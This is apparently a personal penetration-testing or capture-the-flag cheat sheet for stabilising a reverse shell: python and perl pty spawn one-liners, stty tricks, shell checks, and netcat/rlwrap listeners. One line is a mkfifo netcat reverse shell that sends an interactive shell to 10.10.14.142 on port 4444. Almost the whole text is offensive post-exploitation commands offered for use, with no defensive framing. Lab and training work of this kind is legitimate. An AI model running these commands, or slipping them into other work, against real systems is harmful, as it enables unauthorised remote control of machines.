for Bash:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- python3
```
python -c 'import pty; pty.spawn("/bin/bash")' 
```
- python
if no bash, press ctrl-z, which suspends terminal. type this into normal terminal:
```
stty raw -echo; fg
```
- press enter twice
- 
sometimes just `/bin/bash` or `/bin/sh`could work

```
echo os.system('/bin/bash')
```

```
perl -e 'exec "/bin/bash";'
```
- if perl is installed

t/s above commands:
```
echo $0
```
- see what shell im in
```
which python
```
- see if python exists
```
which python3
```
- see if python3 exists

if shell is non-interactive (can run commands but cant cd) and get `No input file specified` response when trying above commands and/or shell says something like `Can't acces tty; job crontol turned off` initially, try another reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.142 4444 >/tmp/f
```
- listener `nc -lvnp 4444`

to fix `nc` shell:
```
export SHELL=/bin/bash 
```

```
export TERM=xterm-256color 
```

```
stty rows 24 columns 80
```

For windows, start listener with rlwrap:
```
rlwrap -cAr nc -lnvp 443
```